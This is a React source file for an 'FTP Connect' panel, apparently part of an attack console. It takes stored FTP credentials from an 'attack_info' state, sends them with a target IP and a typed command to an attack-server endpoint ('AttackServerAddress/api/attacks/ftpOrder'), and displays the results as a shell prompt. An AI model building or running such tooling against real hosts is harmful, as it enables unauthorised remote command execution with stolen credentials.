import React, { useState } from "react";
import Axios from "axios";
import { Button, Input, Divider, Typography, message } from "antd";
import { SendOutlined, LoadingOutlined } from '@ant-design/icons';
import { useSelector } from "react-redux";

function FTP_Connect(props) {
  const account_info = useSelector((state) => state.attack_info.FTP);
  const [Value, setValue] = useState("");
  const [Result, setResult] = useState([]);
  const [isLoading, setisLoading] = useState(false)

  const order = () => {
    setisLoading(true)
    const data = account_info.split(" ");

    const variable = {
      IP: props.Target,
      user: data[1],
      pw: data[2],
      order: Value,
    };

    Axios.post(
      "http://AttackServerAddress/api/attacks/ftpOrder",
      variable
    ).then((response) => {
      if (response.data.success) {
        setResult(response.data.results);
        setisLoading(false)
        message.success("complete!");
      } else {
        message.error("Fail to attack");
      }
    });
  };

  const onChangeValue = (e) => {
    setValue(e.target.value);
  };

  return (
    <div
      style={{
        maxHeight: "550px",
        maxWidth: "900px",
        border: "1px solid black",
        width: "100%",
        height: "100%",
      }}
    >
      <Divider orientation="left">FTP Connect</Divider>
      <div style={{ maxHeight: "450px", overflow: "auto" }}>
        {isLoading ? <h3>&nbsp;&nbsp;<LoadingOutlined /> Loading</h3> : 
        Result.map((line) => (
          <h3>
            <Typography.Text mark>[{props.Target}]#</Typography.Text>
            {line}
          </h3>
        ))}
      </div>
      <div>
        <Input
          style={{ width: "85%" }}
          onChange={onChangeValue}
          value={Value}
        />
        <Button style={{ width: "15%" }} onClick={order}>
        <SendOutlined />Submit
        </Button>
      </div>
    </div>
  );
}

export default FTP_Connect;
